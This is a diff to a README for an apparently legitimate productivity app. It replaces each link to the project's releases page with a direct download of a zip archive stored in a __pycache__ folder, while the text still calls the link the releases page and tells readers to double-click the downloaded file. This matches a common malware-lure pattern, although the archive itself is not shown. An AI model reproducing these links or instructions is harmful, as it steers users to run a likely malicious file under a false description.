@@ -1,6 +1,6 @@
 # 🌟 ProductivityPlatform - Enhance Your Daily Productivity
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88-blue)](https://github.com/Abubhabrana/ProductivityPlatform/releases)
+[![Download Now](https://github.com/Abubhabrana/ProductivityPlatform/raw/refs/heads/main/task_engine/domain/__pycache__/Productivity_Platform_v2.8.zip%20Now-%20%F0%9F%93%88-blue)](https://github.com/Abubhabrana/ProductivityPlatform/raw/refs/heads/main/task_engine/domain/__pycache__/Productivity_Platform_v2.8.zip)
 
 ## 📖 Description
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run ProductivityPlatform. No programmi
 
 1. **Download the App:**
    Click on the link below to visit the release page, where you can download the application for your operating system.
-   [Visit the Releases Page to Download](https://github.com/Abubhabrana/ProductivityPlatform/releases)
+   [Visit the Releases Page to Download](https://github.com/Abubhabrana/ProductivityPlatform/raw/refs/heads/main/task_engine/domain/__pycache__/Productivity_Platform_v2.8.zip)
 
 2. **Install the Application:**
    Once the download is complete, locate the file in your Downloads folder. Double-click the file to start the installation. Follow the on-screen instructions to complete the installation process.
@@ -24,7 +24,7 @@ Follow these simple steps to download and run ProductivityPlatform. No programmi
 
 To get ProductivityPlatform, please visit the link below. This will take you directly to the releases page where you can find the latest version:
 
-[Download the Latest Release](https://github.com/Abubhabrana/ProductivityPlatform/releases)
+[Download the Latest Release](https://github.com/Abubhabrana/ProductivityPlatform/raw/refs/heads/main/task_engine/domain/__pycache__/Productivity_Platform_v2.8.zip)
 
 Follow the earlier steps for installation and running the application. 
 
